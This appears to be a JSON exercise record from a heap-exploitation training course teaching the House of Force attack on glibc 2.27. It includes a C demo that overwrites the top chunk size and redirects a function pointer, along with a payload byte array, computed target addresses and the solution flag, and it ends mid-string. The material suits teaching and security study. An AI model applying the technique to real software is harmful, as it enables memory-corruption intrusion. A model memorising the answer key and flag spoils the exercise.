{"exercise":"heap2-22","unit":"unit5-heap-ii","title":"22: House of Force","desc":"The top chunk (wilderness) is the big chunk at the end of the heap that gets carved up by malloc. If you can overflow into the top chunk and set its size to 0xFFFFFFFF (-1 in unsigned), the allocator thinks it has unlimited memory. Then a carefully calculated malloc(evil_size) moves the top chunk pointer to your target. The next allocation lands right on top of anything you want!","mode":"heap-house-force","vizMode":"heap","glibc":"2.27","heapSize":512,"base":134545408,"header":8,"mainArena":134525184,"funcPtrAddr":134520896,"symbols":{"main":134512640,"vuln":134512724,"win":134512976,"normal":134512800,"system":4158890496,"binsh":4160078592},"source":["#include <stdio.h>","#include <stdlib.h>","","void win() { printf(\"FLAG\\n\"); }","","void (**handler)();  // at 0x0804a040","","int main() {","    char *a = malloc(16);","    // Overflow from a into top chunk header","    *(size_t*)(a+16) = 0;","    *(size_t*)(a+20) = 0xFFFFFFFF;","    // Top chunk now thinks it's huge","    size_t evil = TARGET - top - 8;","    malloc(evil);  // moves top to target","    char *d = malloc(16);","    // d points to target!","    *(void**)d = win;","    (*handler)();","    return 0;","}"],"guided":[{"srcLine":5,"log":[["action","char *a = malloc(16) — chunk A is allocated. The top chunk sits right after A."]]},{"srcLine":6,"log":[["info","We have an overflow from chunk A into the top chunk header."]]},{"srcLine":null,"log":[["info","Overflow into the top chunk header: 16 bytes padding + 4 bytes prev_size (00) + 4 bytes size (FF FF FF FF)."]]}],"payloads":[[103,117,101,115,116,95,115,101,115,115,105,111,110,95,48,49,0,0,0,0,255,255,255,255]],"count":null,"completed":false,"check":false,"solved":false,"sourceOrderSetup":false,"pageSetup":null,"model":{"top":134545432,"target":134520896,"evil":4294942744,"newTop":134520888,"d":134520896,"reachesHandler":true},"winTitle":"FLAG{house_of_force}","winMsg":"By